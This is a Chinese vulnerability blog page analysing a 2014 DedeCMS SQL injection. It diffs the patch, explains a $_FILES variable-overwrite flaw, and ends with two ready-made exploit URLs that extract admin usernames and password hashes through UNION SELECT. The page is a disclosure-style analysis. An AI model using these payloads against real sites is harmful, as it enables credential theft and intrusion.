<!DOCTYPE HTML>
<html>
<head>
    <meta charset="UTF-8">
    <title> Dedecms 最新通杀注入分析 -  漏洞时代 - 最新漏洞_0DaY5.CoM</title>
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0, minimum-scale=1.0, maximum-scale=1.0">
    <link rel="shortcut icon" href="http://0day5.com/usr/themes/DUX/img/favicon.ico">
    <meta name="apple-mobile-web-app-title" content="漏洞时代 - 最新漏洞_0DaY5.CoM">
    <meta http-equiv="Cache-Control" content="no-siteapp">
    <meta http-equiv="Cache-Control" content="no-transform">

    <link rel="stylesheet" href="//cdn.jsdelivr.net/bootstrap/3.2.0/css/bootstrap.min.css" type="text/css" media="all" />
    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css" type="text/css" media="all" />
    <link rel="stylesheet" href="http://0day5.com/usr/themes/DUX/css/main.css " type="text/css" media="all" />

    <style>
    </style>

    <script type="text/javascript" src="//cdn.jsdelivr.net/jquery/1.9.1/jquery.min.js"></script>
    <!--加载进度条-->
    <link href="//cdn.jsdelivr.net/pace/1.0.2/themes/orange/pace-theme-flash.css" rel="stylesheet" />
    <script> paceOptions = { elements: {selectors: ['#footer']}};</script>
    <script src="//cdn.jsdelivr.net/pace/1.0.2/pace.min.js"></script>
    <!--[if lt IE 9]><script src="//cdn.jsdelivr.net/html5shiv/3.7.3/html5shiv.min.js"></script><![endif]-->

    <meta name="description" content="/** by phithon* http://www.leavesongs.com &amp; http://xdsec.org*/最近两天，乌云提交了两个Dedecms，闹得沸沸扬扬，织梦今天发布了补..." />
<meta name="keywords" content="dedecms,注入" />
<script type="text/javascript">
(function () {
    var event = document.addEventListener ? {
        add: 'addEventListener',
        triggers: ['scroll', 'mousemove', 'keyup', 'touchstart'],
        load: 'DOMContentLoaded'
    } : {
        add: 'attachEvent',
        triggers: ['onfocus', 'onmousemove', 'onkeyup', 'ontouchstart'],
        load: 'onload'
    }, added = false;

    document[event.add](event.load, function () {
        var r = document.getElementById('respond-post-1346'),
            input = document.createElement('input');
        input.type = 'hidden';
        input.name = '_';
        input.value = (function () {
    var _7lzwT4L = 'ec'//'aUI'
+'5ba'//'Dza'
+'4'//'5'
+'f'//'Xf'
+'6d'//'8J'
+'4'//'8'
+'5'//'2y'
+'c'//'dhu'
+//'YsP'
'YsP'+'XmD'//'XmD'
+''///*'CxY'*/'CxY'
+//'iO'
'9'+'0f0'//'etl'
+/* 'E'//'E' */''+/* 'g9g'//'g9g' */''+'a'//'qU'
+''///*'VB'*/'VB'
+'3Z6'//'3Z6'
+/* 'a'//'a' */''+//'4qX'
'4qX'+'D'//'D'
+'8'//'Co'
+'a'//'h'
+//'mq7'
'mq7'+'279'//'IiU'
+//'Ep'
'e'+//'p1l'
'564'+//'ZS'
'f'+//'K3k'
'865'+'7c'//'yZ'
, _StUJF = [[12,15],[12,15],[17,20],[17,20],[17,18],[19,22]];
    
    for (var i = 0; i < _StUJF.length; i ++) {
        _7lzwT4L = _7lzwT4L.substring(0, _StUJF[i][0]) + _7lzwT4L.substring(_StUJF[i][1]);
    }

    return _7lzwT4L;
})();

        if (null != r) {
            var forms = r.getElementsByTagName('form');
            if (forms.length > 0) {
                function append() {
                    if (!added) {
                        forms[0].appendChild(input);
                        added = true;
                    }
                }
            
                for (var i = 0; i < event.triggers.length; i ++) {
                    var trigger = event.triggers[i];
                    document[event.add](trigger, append);
                    window[event.add](trigger, append);
                }
            }
        }
    });
})();
</script><script type="text/javascript" src="http://0day5.com/usr/plugins/SyntaxHighlighter/scripts/shCore.min.js"></script>
<script type="text/javascript" src="http://0day5.com/usr/plugins/SyntaxHighlighter/scripts/shAutoloader.js"></script>
<link rel="stylesheet" type="text/css" href="http://0day5.com/usr/plugins/SyntaxHighlighter/styles/shCoreEclipse.css" />
</head>

<body class="single">
    <header class="header">
        <div class="container">
            <h1 class="logo">
                <a href="http://0day5.com/"><img src="http://0day5.com/usr/themes/DUX/img/logo.png" alt="漏洞时代 - 最新漏洞_0DaY5.CoM" />漏洞时代 - 最新漏洞_0DaY5.CoM</a>
            </h1>
            <div class="brand"></div>
            <ul class="site-nav site-navbar">
                <li><a href="http://0day5.com/"><i class="fa fa-home"></i>首页</a></li>
                <li><a href="http://0day5.com/category/uncategorized/"> Others</a></li>
                <li><a href="http://0day5.com/category/asp/"> ASP</a></li>
                <li><a href="http://0day5.com/category/php/"> PHP</a></li>
                <li><a href="http://0day5.com/category/asp-net/"> ASP.NET</a></li>
                <li><a href="http://0day5.com/category/jsp/"> JSP</a></li>
                <li><a href="http://0day5.com/category/intelligent/"> Intelligent</a></li>
                <li><a href="http://0day5.com/category/windows/"> Windows</a></li>
                <li><a href="http://0day5.com/category/linuxunix/"> Linux/Unix</a></li>
                <li><a href="http://0day5.com/category/app/"> APP</a></li>
                <li>
                    <a><i class="fa fa-file-text-o"></i>关于</a>
                    <ul class="sub-menu">
                        <li ><a href="http://0day5.com/cross.html">碎碎念</a></li>
                        <li ><a href="http://0day5.com/about.html">关于</a></li>
                    </ul>
                </li>
                <li class="navto-search">
                    <a href="javascript:;" class="search-show active"><i class="fa fa-search"></i></a>
                </li>
            </ul>
            <i class="fa fa-bars m-icon-nav"></i>
        </div>
    </header>
    <div class="site-search">
        <div class="container">
            <form method="get" class="site-search-form" action="http://0day5.com/">
                <input class="search-input" name="s" type="text" placeholder="输入关键字" value="">
                <button class="search-btn" type="submit"><i class="fa fa-search"></i></button>
            </form>
        </div>
    </div>
    <!--header-->
    <section class="container">
        <div class="content-wrap">
            <div class="content">
                <header class="article-header">
                    <h1 class="article-title"><a href="http://0day5.com/archives/1346/"> Dedecms 最新通杀注入分析</a></h1>
                    <div class="article-meta">
                        <span class="item">2014-02-28</span>
                        <span class="item">分类：<a href="http://0day5.com/category/php/">PHP</a></span>
                        <span class="item post-views">阅读(17971)</span>
                        <span class="item">评论(8)</span>
                    </div>
                </header>
                <article class="article-content">
                    <p>/*<br />
* by phithon<br />
* http://www.leavesongs.com & http://xdsec.org<br />
*/</p><p>最近两天，乌云提交了两个Dedecms，闹得沸沸扬扬，织梦今天发布了补丁，于是就去下载回来对比补丁，下面来分析下其中的一个注入。<br />
首先对比下补丁，发现修改了几个文件，其中的\include\uploadsafe.inc.php修改代码</p><p>[php]</p><p><?php<br />
//正在比较文件 3.php 和 4.PHP<br />
//***** 修补后.php<br />
}<br />
//$$_key = $_FILES[$_key]['tmp_name'] = str_replace("\\\\", "\\", $_FILES[$_key]['tmp_name']);<br />
$$_key = $_FILES[$_key]['tmp_name'] = $_FILES[$_key]['tmp_name'];<br />
${$_key.'_name'} = $_FILES[$_key]['name'];<br />
//***** 修补前.PHP<br />
}<br />
$$_key = $_FILES[$_key]['tmp_name'] = str_replace("\\\\", "\\", $_FILES[$_key]['tmp_name']);<br />
//吧$_FILES[$_key]['tmp_name']里面的\\\\替换为\\<br />
${$_key.'_name'} = $_FILES[$_key]['name'];<br />
[/php]<br />
也就是说这里的str_replace替换可能就是注入的关键！但是$_FILES[$_key]['tmp_name']是php系统生成的随机变量，默认不可控。<br />
看到/include/common.inc.php的一段代码：<br />
[php]<br />
function _RunMagicQuotes(&$svar)<br />
{<br />
if(!get_magic_quotes_gpc())<br />
{<br />
if( is_array($svar) )<br />
{<br />
foreach($svar as $_k => $_v) $svar[$_k] = _RunMagicQuotes($_v);<br />
}<br />
else<br />
{<br />
if( strlen($svar)>0 && preg_match('#^(cfg_|GLOBALS|_GET|_POST|_COOKIE)#',$svar) )<br />
{<br />
exit('Request var not allow!');<br />
}<br />
$svar = addslashes($svar);<br />
}<br />
}<br />
return $svar;</p><p>}</p><p>if (!defined('DEDEREQUEST'))<br />
{<br />
//检查和注册外部提交的变量   (2011.8.10 修改登录时相关过滤)<br />
function CheckRequest(&$val) {<br />
if (is_array($val)) {<br />
foreach ($val as $_k=>$_v) {<br />
if($_k == 'nvarname') continue;<br />
CheckRequest($_k);<br />
CheckRequest($val[$_k]);<br />
}<br />
} else<br />
{<br />
if( strlen($val)>0 && preg_match('#^(cfg_|GLOBALS|_GET|_POST|_COOKIE)#',$val)  )<br />
{<br />
exit('Request var not allow!');</p><p>}<br />
}<br />
}<br />
//var_dump($_REQUEST);exit;</p><p>CheckRequest($_REQUEST);<br />
foreach(Array('_GET','_POST','_COOKIE') as $_request)<br />
{<br />
foreach($$_request as $_k => $_v)<br />
{<br />
if($_k == 'nvarname') ${$_k} = $_v;<br />
else ${$_k} = _RunMagicQuotes($_v);<br />
}<br />
}<br />
}[/php]<br />
只要变量名不含cfg_|GLOBALS|_GET|_POST|_COOKIE就行了，利用上面的代码可以覆盖$_FILES，<br />
同时利用这句代码：<br />
[php]<br />
$$_key = $_FILES[$_key]['tmp_name'] = str_replace("\\\\", "\\", $_FILES[$_key]['tmp_name']);[/php]<br />
就可以覆盖任意变量了，结合str_replace的替换，就可以带入单引号了。可以引入单引号，注入就一堆了，看到plus/recommend.php的一段代码：<br />
[php]<br />
if($action=='')</p><p>{</p><p>if($type=='sys'){</p><p>//读取文档信息</p><p>$arcRow = GetOneArchive($aid);</p><p>if($arcRow['aid']=='')</p><p>{</p><p>ShowMsg("无法把未知文档推荐给好友!","-1");</p><p>exit();</p><p>}</p><p>extract($arcRow, EXTR_SKIP);</p><p>} else {</p><p>$arcRow=$dsql->GetOne("SELECT s.*,t.* FROM `#@__member_stow` AS s LEFT JOIN `#@__member_stowtype` AS t ON s.type=t.stowname WHERE s.aid='$aid' AND s.type='$type'");</p><p>if(!is_array($arcRow)){</p><p>ShowMsg("无法把未知文档推荐给好友!","-1");</p><p>exit();</p><p>}</p><p>$arcRow['arcurl']=$arcRow['indexurl']."=".$arcRow['aid'];</p><p>extract($arcRow, EXTR_SKIP);</p><p>}</p><p>}[/php]<br />
利用上面分析的漏洞，最终构造的exp为：[php]<br />
http://0day5.com/plus/recommend.php?action=&aid=1&_FILES[type][tmp_name]=\'  or mid=@`\'` /*!50000union*//*!50000select*/1,2,3,(select CONCAT(0x7c,userid,0x7c,pwd)+from+`%23@__admin` limit+0,1),5,6,7,8,9%23@`\'`+&_FILES[type][name]=1.jpg&_FILES[type][type]=application/octet-stream&_FILES[type][size]=6873[/php]<br />
获取的另外一枚<br />
[php]http://0day5.com/plus/recommend.php?aid=1&_FILES[type][name]&_FILES[type][size]&_FILES[type][type]&_FILES[type][tmp_name]=aa\'and+char(@`'`)+/*!50000Union*/+/*!50000SeLect*/+1,2,3,group_concat(userid,0x23,pwd),5,6,7,8,9 from `%23@__admin`%23[/php]</p><p><img src="http://0day5.com/wp-content/uploads/2014/02/exp.png" alt="" /></p>                </article>

                <div class="post-copyright">本原创文章未经允许不得转载 | 当前页面：<a href="http://0day5.com/">漏洞时代 - 最新漏洞_0DaY5.CoM</a> &raquo; <a href="http://0day5.com/archives/1346/"> Dedecms 最新通杀注入分析</a></div>
                <div class="article-tags">标签：<a href="http://0day5.com/tag/dedecms/">dedecms</a> <a href="http://0day5.com/tag/%E6%B3%A8%E5%85%A5/">注入</a></div>
                <nav class="article-nav">
                    <span class="article-nav-prev">上一篇<br><a href="http://0day5.com/archives/1315/" title="Dedecms 会员中心注入漏洞11">Dedecms 会员中心注入漏洞11</a></span>
                    <span class="article-nav-next">下一篇<br><a href="http://0day5.com/archives/1349/" title="DedeCms recommend.php注入">DedeCms recommend.php注入</a></span>
                </nav>
                <div class="relates"><div class="title"><h3>相关推荐</h3></div>
                    <ul>
                        <li><a href="http://0day5.com/archives/4424/" title="OrientDB &lt;=2.22 代码执行">OrientDB &lt;=2.22 代码执行</a></li>
                        <li><a href="http://0day5.com/archives/4421/" title="FineCMS SYS_KEY未初始化导致任意文件写入">FineCMS SYS_KEY未初始化导致任意文件写入</a></li>
                        <li><a href="http://0day5.com/archives/4418/" title="Struts2高危漏洞S2-048动态分析">Struts2高危漏洞S2-048动态分析</a></li>
                        <li><a href="http://0day5.com/archives/4405/" title="通杀FineCMS5.0.8及版本以下getshell漏洞的">通杀FineCMS5.0.8及版本以下getshell漏洞的</a></li>
                        <li><a href="http://0day5.com/archives/4400/" title="finecms前台任意文件上传">finecms前台任意文件上传</a></li>
                        <li><a href="http://0day5.com/archives/4397/" title="FineCMS v2.1.5前台一处XSS+CSRF可getshell">FineCMS v2.1.5前台一处XSS+CSRF可getshell</a></li>
                        <li><a href="http://0day5.com/archives/4396/" title="PHPCMS V9.6.2 SQL注入漏洞分析">PHPCMS V9.6.2 SQL注入漏洞分析</a></li>
                        <li><a href="http://0day5.com/archives/4383/" title="Maccms8.x 命令执行漏洞分析">Maccms8.x 命令执行漏洞分析</a></li>
                    </ul>
                </div>

    <div class="title" id="comments">
        <h3>评论 <b>8</b></h3>
    </div>
    <div id="respond-post-1346" class="no_webshot">
        <form action="http://0day5.com/archives/1346/comment" method="post" id="commentform">
            <div class="comt">
                <div class="comt-title">
                    <img alt="" data-src="http://0day5.com/usr/themes/DUX/img/avatar-default.png" srcset="http://0day5.com/usr/themes/DUX/img/avatar-default.png 2x" class="avatar photo" height="50" width="50" src="http://0day5.com/usr/themes/DUX/img/avatar-default.png">
                    <p><a id="cancel-comment-reply-link" href="http://0day5.com/archives/1346/#respond-post-1346" rel="nofollow" style="display:none" onclick="return TypechoComment.cancelReply();">取消</a></p>
                </div>
                <div class="comt-box">
                    <textarea placeholder="欢迎在此评论， be nice & cool." class="input-block-level comt-area" name="text" id="comment" cols="100%" rows="3" tabindex="1" ></textarea>
                    <div class="comt-ctrl">
                        <div class="comt-tips"></div>
                        <button type="submit" name="submit" id="submit" tabindex="5">提交评论</button>
                        <input type="hidden" name="_" value="9187541e690af378f927dfebb3c41053">
                    </div>
                </div>
                <div class="comt-comterinfo" id="comment-author-info" >
                    <ul>
                        <li class="form-inline"><label class="hide" for="author">昵称</label><input class="ipt" type="text" name="author" id="author" value="" tabindex="2" placeholder="昵称（必填）" required><span class="text-muted"></span></li>
                        <li class="form-inline"><label class="hide" for="mail">邮箱</label><input class="ipt" type="text" name="mail" id="mail" value="" tabindex="3" placeholder="邮箱（必填）"  required><span class="text-muted"></span></li>
                        <li class="form-inline"><label class="hide" for="url">网址</label><input class="ipt" type="text" name="url" id="url" value="" tabindex="4" placeholder="网址"><span class="text-muted"></span></li>
                    </ul>
                </div>
            </div>
        </form>
    </div>
    <div id="postcomments">
        <ol class="commentlist">
    <li id="pingback-12038" class="comment byuser comment-author-admin bypostauthor depth-1 comment-body comment-parent odd">
        <div class="comt-avatar"><img alt="" data-src="//cn.gravatar.com/avatar/d41d8cd98f00b204e9800998ecf8427e?s=50&r=G&d=mm" srcset="//cn.gravatar.com/avatar/d41d8cd98f00b204e9800998ecf8427e?s=50&r=G&d=mm 2x" class="avatar photo" height="50" width="50" src="http://0day5.com/usr/themes/DUX/img/avatar-default.png"></div>
        <div class="comt-main" id="div-pingback-12038">
            <p><p>[...]MISC[...]</p></p>
            <div class="comt-meta">
                <span class="comt-author"><a href="http://anitakluman.co.uk/26-december-2017-1919" rel="external nofollow">26 December, 2017 19:19 R11; Anita Kluman Online</a></span> 2017-12-27&nbsp;&nbsp;&nbsp;&nbsp;<a href="http://0day5.com/archives/1346/?replyTo=12038#respond-post-1346" rel="nofollow" onclick="return TypechoComment.reply('pingback-12038', 12038);">回复</a>            </div>
        </div>
        </li>
    <li id="pingback-12035" class="comment byuser comment-author-admin bypostauthor depth-1 comment-body comment-parent even">
        <div class="comt-avatar"><img alt="" data-src="//cn.gravatar.com/avatar/d41d8cd98f00b204e9800998ecf8427e?s=50&r=G&d=mm" srcset="//cn.gravatar.com/avatar/d41d8cd98f00b204e9800998ecf8427e?s=50&r=G&d=mm 2x" class="avatar photo" height="50" width="50" src="http://0day5.com/usr/themes/DUX/img/avatar-default.png"></div>
        <div class="comt-main" id="div-pingback-12035">
            <p><p>[...]CVE-2017-17731MISC[...]</p></p>
            <div class="comt-meta">
                <span class="comt-author"><a href="http://opsfolio.cak.netspective.com/2017/12/25/sb17-359-vulnerability-summary-for-the-week-of-december-18-2017/" rel="external nofollow">SB17-359: Vulnerability Summary for the Week of December 18, 2017 R11; Opsfolio</a></span> 2017-12-26&nbsp;&nbsp;&nbsp;&nbsp;<a href="http://0day5.com/archives/1346/?replyTo=12035#respond-post-1346" rel="nofollow" onclick="return TypechoComment.reply('pingback-12035', 12035);">回复</a>            </div>
        </div>
        </li>
    <li id="pingback-12033" class="comment byuser comment-author-admin bypostauthor depth-1 comment-body comment-parent odd">
        <div class="comt-avatar"><img alt="" data-src="//cn.gravatar.com/avatar/d41d8cd98f00b204e9800998ecf8427e?s=50&r=G&d=mm" srcset="//cn.gravatar.com/avatar/d41d8cd98f00b204e9800998ecf8427e?s=50&r=G&d=mm 2x" class="avatar photo" height="50" width="50" src="http://0day5.com/usr/themes/DUX/img/avatar-default.png"></div>
        <div class="comt-main" id="div-pingback-12033">
            <p><p>[...]http://0day5.com/archives/1346/[...]</p></p>
            <div class="comt-meta">
                <span class="comt-author"><a href="https://vul.anbai.com/67076.html" rel="external nofollow">CVE-2017-17731 R11; 安百科技</a></span> 2017-12-19&nbsp;&nbsp;&nbsp;&nbsp;<a href="http://0day5.com/archives/1346/?replyTo=12033#respond-post-1346" rel="nofollow" onclick="return TypechoComment.reply('pingback-12033', 12033);">回复</a>            </div>
        </div>
        </li>
    <li id="comment-424" class="comment byuser comment-author-admin bypostauthor depth-1 comment-body comment-parent even">
        <div class="comt-avatar"><img alt="" data-src="//cn.gravatar.com/avatar/26dd1992158fd372dfaa8ff86208af6d?s=50&r=G&d=mm" srcset="//cn.gravatar.com/avatar/26dd1992158fd372dfaa8ff86208af6d?s=50&r=G&d=mm 2x" class="avatar photo" height="50" width="50" src="http://0day5.com/usr/themes/DUX/img/avatar-default.png"></div>
        <div class="comt-main" id="div-comment-424">
            <p><p>http://lcx.cc/?i=1682说只要plus存在就能拿shell，但是这文章里面说的看不懂，求详细！</p></p>
            <div class="comt-meta">
                <span class="comt-author"><a href="http://www.baidu.com" rel="external nofollow">gz_hack</a></span> 2014-03-29&nbsp;&nbsp;&nbsp;&nbsp;<a href="http://0day5.com/archives/1346/?replyTo=424#respond-post-1346" rel="nofollow" onclick="return TypechoComment.reply('comment-424', 424);">回复</a>            </div>
        </div>
        </li>
    <li id="comment-380" class="comment byuser comment-author-admin bypostauthor depth-1 comment-body comment-parent odd">
        <div class="comt-avatar"><img alt="" data-src="//cn.gravatar.com/avatar/fa736b0248bf4af5e07b972cc0606b18?s=50&r=G&d=mm" srcset="//cn.gravatar.com/avatar/fa736b0248bf4af5e07b972cc0606b18?s=50&r=G&d=mm 2x" class="avatar photo" height="50" width="50" src="http://0day5.com/usr/themes/DUX/img/avatar-default.png"></div>
        <div class="comt-main" id="div-comment-380">
            <p><p>提示 无法把未知文档推荐给好友! :?: 是不是就说明已经修复了。。- -</p></p>
            <div class="comt-meta">
                <span class="comt-author">1234</span> 2014-03-01&nbsp;&nbsp;&nbsp;&nbsp;<a href="http://0day5.com/archives/1346/?replyTo=380#respond-post-1346" rel="nofollow" onclick="return TypechoComment.reply('comment-380', 380);">回复</a>            </div>
        </div>
    <ul class="children">
    <li id="comment-381" class="comment byuser comment-author-admin bypostauthor depth-2 comment-body comment-child comment-level-odd odd">
        <div class="comt-avatar"><img alt="" data-src="//cn.gravatar.com/avatar/fd88b035b05df7be3ef3f8464bba5fc2?s=50&r=G&d=mm" srcset="//cn.gravatar.com/avatar/fd88b035b05df7be3ef3f8464bba5fc2?s=50&r=G&d=mm 2x" class="avatar photo" height="50" width="50" src="http://0day5.com/usr/themes/DUX/img/avatar-default.png"></div>
        <div class="comt-main" id="div-comment-381">
            <p><p>不清楚，或许吧~表示仅仅是转载本机测试了</p></p>
            <div class="comt-meta">
                <span class="comt-author"><a href="http://0day5.com" rel="external nofollow">0day5</a></span> 2014-03-03&nbsp;&nbsp;&nbsp;&nbsp;<a href="http://0day5.com/archives/1346/?replyTo=381#respond-post-1346" rel="nofollow" onclick="return TypechoComment.reply('comment-381', 381);">回复</a>            </div>
        </div>
    <ul class="children">
    <li id="comment-390" class="comment byuser comment-author-admin bypostauthor depth-3 comment-body comment-child comment-level-even odd">
        <div class="comt-avatar"><img alt="" data-src="//cn.gravatar.com/avatar/02dace9ed4aefaf794a869d53c854a46?s=50&r=G&d=mm" srcset="//cn.gravatar.com/avatar/02dace9ed4aefaf794a869d53c854a46?s=50&r=G&d=mm 2x" class="avatar photo" height="50" width="50" src="http://0day5.com/usr/themes/DUX/img/avatar-default.png"></div>
        <div class="comt-main" id="div-comment-390">
            <p><p>能不能读取到  后台目录名</p></p>
            <div class="comt-meta">
                <span class="comt-author"><a href="http://blog.ff16.com" rel="external nofollow">阳天</a></span> 2014-03-09&nbsp;&nbsp;&nbsp;&nbsp;<a href="http://0day5.com/archives/1346/?replyTo=390#respond-post-1346" rel="nofollow" onclick="return TypechoComment.reply('comment-390', 390);">回复</a>            </div>
        </div>
    <ul class="children">
    <li id="comment-392" class="comment byuser comment-author-admin bypostauthor depth-4 comment-body comment-child comment-level-odd odd">
        <div class="comt-avatar"><img alt="" data-src="//cn.gravatar.com/avatar/fd88b035b05df7be3ef3f8464bba5fc2?s=50&r=G&d=mm" srcset="//cn.gravatar.com/avatar/fd88b035b05df7be3ef3f8464bba5fc2?s=50&r=G&d=mm 2x" class="avatar photo" height="50" width="50" src="http://0day5.com/usr/themes/DUX/img/avatar-default.png"></div>
        <div class="comt-main" id="div-comment-392">
            <p><p>不能哦...</p></p>
            <div class="comt-meta">
                <span class="comt-author"><a href="http://0day5.com" rel="external nofollow">0day5</a></span> 2014-03-11&nbsp;&nbsp;&nbsp;&nbsp;<a href="http://0day5.com/archives/1346/?replyTo=392#respond-post-1346" rel="nofollow" onclick="return TypechoComment.reply('comment-392', 392);">回复</a>            </div>
        </div>
        </li></ul>    </li></ul>    </li></ul>    </li></ol>
        <div class="pagenav">
                    </div>
    </div>
            </div>
        </div>
    <!-- start sidebar -->
    <aside class="sidebar">
    <div class="widget widget-tops">
        <ul class="widget-nav"><li class="active">最新文章</li></ul>
        <ul class="widget-navcontent">
            <li class="item item-01 active">
                <ul>
                    <li><time>07-15</time><a href="http://0day5.com/archives/4424/" title="OrientDB &lt;=2.22 代码执行">OrientDB &lt;=2.22 代码执行</a></li>
                    <li><time>07-10</time><a href="http://0day5.com/archives/4421/" title="FineCMS SYS_KEY未初始化导致任意文件写入">FineCMS SYS_KEY未初始化导致任意文件写入</a></li>
                    <li><time>07-08</time><a href="http://0day5.com/archives/4418/" title="Struts2高危漏洞S2-048动态分析">Struts2高危漏洞S2-048动态分析</a></li>
                    <li><time>07-07</time><a href="http://0day5.com/archives/4405/" title="通杀FineCMS5.0.8及版本以下getshell漏洞的">通杀FineCMS5.0.8及版本以下getshell漏洞的</a></li>
                    <li><time>06-15</time><a href="http://0day5.com/archives/4400/" title="finecms前台任意文件上传">finecms前台任意文件上传</a></li>
                    <li><time>05-26</time><a href="http://0day5.com/archives/4397/" title="FineCMS v2.1.5前台一处XSS+CSRF可getshell">FineCMS v2.1.5前台一处XSS+CSRF可getshell</a></li>
                </ul>
            </li>
        </ul>
    </div>

    <div class="widget widget_ui_textasb"><a class="style02" href="https://github.com/hiCasper/Typecho-theme-DUX" target="_blank"><strong>推荐</strong><h2>DUX主题 新一代主题</h2><p>DUX for Typecho</p></a></div>
    <div class="ds-recent-comments" data-num-items="5" data-show-avatars="1" data-show-time="1" data-show-title="1" data-show-admin="1" data-excerpt-length="70"></div>
    <div class="widget widget_ui_comments">
        <h3>最新评论</h3>
        <ul>
            <li>
            <a href="http://0day5.com/archives/1210/#pingback-30557" title="U-Mail注入之任意代码写入exp上的评论">
                <strong>注入资源汇总PE注入,DLL注入,代码注入,Shellcode注入,ELF注入-Legend‘s BLog</strong> (03-29) 说：
                <br>[...]2014.01 [] U-M...</a></li>
            <li>
            <a href="http://0day5.com/archives/2627/#pingback-30555" title="逐浪CMS2个文件两个注入5处问题代码 另附其他注入绕过方式上的评论">
                <strong>注入资源汇总PE注入,DLL注入,代码注入,Shellcode注入,ELF注入-Legend‘s BLog</strong> (03-29) 说：
                <br>[...]2014.12 [] 逐浪C...</a></li>
            <li>
            <a href="http://0day5.com/archives/4364/#pingback-30553" title="DoubleAgent技术：任意进程下代码注入与权限维持上的评论">
                <strong>注入资源汇总PE注入,DLL注入,代码注入,Shellcode注入,ELF注入-Legend‘s BLog</strong> (03-29) 说：
                <br>[...]2017.03 [] Dou...</a></li>
            <li>
            <a href="http://0day5.com/archives/4383/#pingback-12040" title="Maccms8.x 命令执行漏洞分析上的评论">
                <strong>26 December, 2017 19:19 R11; Anita Kluman Online</strong> (12-27) 说：
                <br>[...]MISC[...]</a></li>
            <li>
            <a href="http://0day5.com/archives/1542/#pingback-12039" title="DedeCMS另一处全版本通杀SQL注入上的评论">
                <strong>26 December, 2017 19:19 R11; Anita Kluman Online</strong> (12-27) 说：
                <br>[...]MISC[...]</a></li>
            <li>
            <a href="http://0day5.com/archives/1346/#pingback-12038" title=" Dedecms 最新通杀注入分析上的评论">
                <strong>26 December, 2017 19:19 R11; Anita Kluman Online</strong> (12-27) 说：
                <br>[...]MISC[...]</a></li>
        </ul>
    </div>
    <div class="widget widget_ui_tags">
        <h3>标签云</h3>
        <div class="items">
            <a href="http://0day5.com/tag/%E6%BC%8F%E6%B4%9E/">漏洞 （131）</a>
            <a href="http://0day5.com/tag/%E6%B3%A8%E5%85%A5/">注入 （83）</a>
            <a href="http://0day5.com/tag/Sql/">Sql （70）</a>
            <a href="http://0day5.com/tag/SQL%E6%B3%A8%E5%85%A5/">SQL注入 （62）</a>
            <a href="http://0day5.com/tag/getshell/">getshell （51）</a>
            <a href="http://0day5.com/tag/dede/">dede （31）</a>
            <a href="http://0day5.com/tag/xss/">xss （30）</a>
            <a href="http://0day5.com/tag/phpcms/">phpcms （28）</a>
            <a href="http://0day5.com/tag/WordPress/">WordPress （23）</a>
            <a href="http://0day5.com/tag/dedecms/">dedecms （22）</a>
            <a href="http://0day5.com/tag/discuz/">discuz （17）</a>
            <a href="http://0day5.com/tag/ecshop/">ecshop （16）</a>
            <a href="http://0day5.com/tag/csrf/">csrf （14）</a>
            <a href="http://0day5.com/tag/DZ/">DZ （13）</a>
            <a href="http://0day5.com/tag/%E5%90%8E%E5%8F%B0/">后台 （12）</a>
            <a href="http://0day5.com/tag/74CMS/">74CMS （12）</a>
            <a href="http://0day5.com/tag/CmsEasy/">CmsEasy （10）</a>
            <a href="http://0day5.com/tag/Espcms/">Espcms （10）</a>
            <a href="http://0day5.com/tag/metinfo/">metinfo （10）</a>
            <a href="http://0day5.com/tag/destoon/">destoon （9）</a>
        </div>
    </div>
    </aside>
    <!-- end sidebar -->
    </section>

    <!--footer-->
    <footer id="footer" class="footer">
        <div class="container">
            <div class="copyright">
                <p>
                    &copy; 2021 <a href="http://0day5.com/">漏洞时代 - 最新漏洞_0DaY5.CoM</a>
                                        <br>
                    Power by <a data-no-instant target="blank" href="http://0day5.com">WordPress</a> | Theme <a data-no-instant target="blank" href="http://0day5.com/">0DAY5</a> <a onclick="gotoTop()" class="m-l-sm text-muted"><i class="iconfont icon-longarrowup"></i></a>
                    </span>
                    <br>
                    <a href="http://0day5.com/feed/" target="_blank">文章 RSS</a> // <a href="http://0day5.com/feed/comments/" target="_blank">评论 RSS</a> //                     &copy; <script language="javascript" type="text/javascript" src="http://js.users.51.la/15173347.js"></script>
              <noscript><a href="http://www.51.la/?15173347" target="_blank"><img alt="&#x6211;&#x8981;&#x5566;&#x514D;&#x8D39;&#x7EDF;&#x8BA1;" src="http://img.users.51.la/15173347.asp" style="border:none" /></a></noscript>
                </p>
            </div>
            <div class="hide"></div>
        </div>
    </footer>
            <script type="text/javascript">
            if (typeof(SyntaxHighlighter) !== undefined) {
                var preList = document.getElementsByTagName('pre');
                for (var i = 0; i < preList.length; i ++) {
                    var children = preList[i].getElementsByTagName('code');
                    if (children.length > 0) {
                        var language = 'plain';
                        var code = children[0], className = code.className;
                        if (!!className) {
                            var match = XRegExp.exec(className, XRegExp('^(lang|language)-(?<language>.*)$'));
                            if (match && match.language) {
                                language = match.language;
                            }
                        }
                        preList[i].className = 'brush: ' + language;
                        preList[i].innerHTML = code.innerHTML;
                    }
                }
                SyntaxHighlighter.autoloader(
                        'applescript           http://0day5.com/usr/plugins/SyntaxHighlighter/scripts/shBrushAppleScript.js',
                        'ahk autohotkey        http://0day5.com/usr/plugins/SyntaxHighlighter/scripts/shBrushAhk.js',
                        'actionscript3 as3     http://0day5.com/usr/plugins/SyntaxHighlighter/scripts/shBrushAS3.js',
                        'bash shell            http://0day5.com/usr/plugins/SyntaxHighlighter/scripts/shBrushBash.js',
                        'bat cmd batch         http://0day5.com/usr/plugins/SyntaxHighlighter/scripts/shBrushBat.js',
                        'coldfusion cf         http://0day5.com/usr/plugins/SyntaxHighlighter/scripts/shBrushColdFusion.js',
                        'cpp c                 http://0day5.com/usr/plugins/SyntaxHighlighter/scripts/shBrushCpp.js',
                        'c# c-sharp csharp     http://0day5.com/usr/plugins/SyntaxHighlighter/scripts/shBrushCSharp.js',
                        'css                   http://0day5.com/usr/plugins/SyntaxHighlighter/scripts/shBrushCss.js',
                        'delphi pascal pas     http://0day5.com/usr/plugins/SyntaxHighlighter/scripts/shBrushDelphi.js',
                        'diff patch            http://0day5.com/usr/plugins/SyntaxHighlighter/scripts/shBrushDiff.js',
                        'erl erlang            http://0day5.com/usr/plugins/SyntaxHighlighter/scripts/shBrushErlang.js',
                        'groovy                http://0day5.com/usr/plugins/SyntaxHighlighter/scripts/shBrushGroovy.js',
